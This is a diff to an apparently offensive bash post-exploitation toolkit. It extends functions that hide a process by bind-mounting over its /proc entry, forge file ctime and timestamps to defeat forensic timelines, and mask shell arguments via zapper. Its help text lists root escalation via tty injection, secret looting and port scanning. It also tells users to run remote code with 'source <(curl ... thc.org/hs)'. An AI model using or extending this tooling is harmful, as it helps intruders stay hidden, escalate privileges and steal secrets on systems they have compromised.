@@ -106,9 +106,11 @@ notime() {
 
 # Set the ctime to the file's mtime
 ctime() {
-    local fn="${1}"
+    local fn
 
-    notime "${fn}" chmod --reference "${fn}" "${fn}"
+    for fn in "$@"; do
+        notime "${fn}" chmod --reference "${fn}" "${fn}"
+    done
 }
 
 # Presever mtime, ctime and birth-time as best as possible.
@@ -145,7 +147,6 @@ notime_cp() {
             chmod --reference "$src" "$dst"
             touch -t "$olddir_date" "$dir"  # Changes ctime
             chmod --reference "$dir" "$dir" # Fixes ctime
-            # [[ -n "$now" ]] && 
             date --set="$now" >/dev/null
             unset olddir_date
         }
@@ -166,7 +167,25 @@ notime_cp() {
     date --set="$now"
 }
 
-resolv() { while read -r x; do r="$(getent hosts "$x")" || continue; echo "${r%% *}"$'\t'"${x}"; done; }
+# domain 2 IPv4
+dns() {
+    local x="${1:?}"
+
+    x="$(getent ahostsv4 "${x}" 2>/dev/null)" || return
+    echo "${x// */}"
+}
+
+resolv() {
+    local x r
+    [ -t 0 ] && [ -n "$1" ] && {
+        echo "$(dns "$1")"$'\t'"${1}"
+        return
+    }
+    while read -r x; do
+        r="$(dns "$x")" || continue
+        echo "${r}"$'\t'"${x}"
+    done
+}
 find_subdomains() {
 	local d="${1//./\\.}"
 	local rexf='[0-9a-zA-Z_.-]{0,64}'"${d}"
@@ -286,7 +305,19 @@ lssr() {
 
 hide() {
     local _pid="${1:-$$}"
-    [[ -L /etc/mtab ]] && { cp /etc/mtab /etc/mtab.bak; mv -f /etc/mtab.bak /etc/mtab; }
+    local ts_d ts_f
+    [[ -L /etc/mtab ]] && {
+        ts_d="$(date -r /etc +%Y%m%d%H%M.%S 2>/dev/null)"
+        # Need stat + date to take timestamp of symlink.
+        ts_f="$(stat -c %y /etc/mtab)"
+        ts_f="$(date -d "${ts_f}" +%Y%m%d%H%M.%S 2>/dev/null)"
+        [ -z "$ts_f" ] && ts_f="${ts_d}"
+        cp /etc/mtab /etc/mtab.bak
+        mv -f /etc/mtab.bak /etc/mtab
+        [ -n "$ts_f" ] && touch -t "$ts_f" /etc/mtab
+        [ -n "$ts_d" ] && touch -t "$ts_d" /etc
+        HS_WARN "Use ${CDC}ctime /etc /etc/mtab${CDM} to fix ctime"
+    }
     [[ $_pid =~ ^[0-9]+$ ]] && { mount -n --bind /dev/shm /proc/$_pid && HS_INFO "PID $_pid is now hidden"; return; }
     local _argstr
     for _x in "${@:2}"; do _argstr+=" '${_x//\'/\'\"\'\"\'}'"; done
@@ -348,6 +379,7 @@ np() {
 }
 
 zapme() {
+    _hs_dep zapper || return
     HS_WARN "Starting new/zapper SHELL. Type '${CDC} source <(curl -SsfL https://thc.org/hs)${CDM}' again."
     exec zapper -f -a"${1:--}" bash -il
 }
@@ -878,6 +910,7 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
         HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
         HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
+        HS_SSH_OPT+=("-oConnectTimeout=5")
     }
     hs_init_dl
 }
@@ -1008,9 +1041,10 @@ ${CDC} notime_cp <src> <dst>                 ${CDM}Copy file. Keep birth-time, c
 ${CDC} ctime <file>                          ${CDM}Set ctime to file's mtime ${CN}${CF}[find . -ctime -1]
 ${CDC} ttyinject                             ${CDM}Become root when root switches to ${USER:-this user}
 ${CDC} wfind <dir> [<dir> ...]               ${CDM}Find writeable directories
-${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
 ${CDC} hgrep <string>                        ${CDM}Grep for pattern, output for humans ${CN}${CF}[hgrep password]
+${CDC} find_subdomain .foobar.com            ${CDM}Search files for sub-domain
 ${CDC} crt foobar.com                        ${CDM}Query crt.sh for all sub-domains
+${CDC} dns foobar.com                        ${CDM}Resolv domain name to IPv4
 ${CDC} rdns 1.2.3.4                          ${CDM}Reverse DNS from multiple public databases
 ${CDC} cn <IP> [<port>]                      ${CDM}Display TLS's CommonName of remote IP
 ${CDC} scan <port> [<IP or file> ...]        ${CDM}TCP Scan a port + IP ${CN}${CF}[scan 22,443,445 10.0.0.1-254]
@@ -1020,6 +1054,7 @@ ${CDC} loot                                  ${CDM}Display common secrets
 ${CDC} lpe                                   ${CDM}Run linPEAS
 ${CDC} ws                                    ${CDM}WhatServer - display server's essentials
 ${CDC} bin                                   ${CDM}Download useful static binaries ${CN}${CF}[bin nmap]
+${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as <name> + all child processes
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
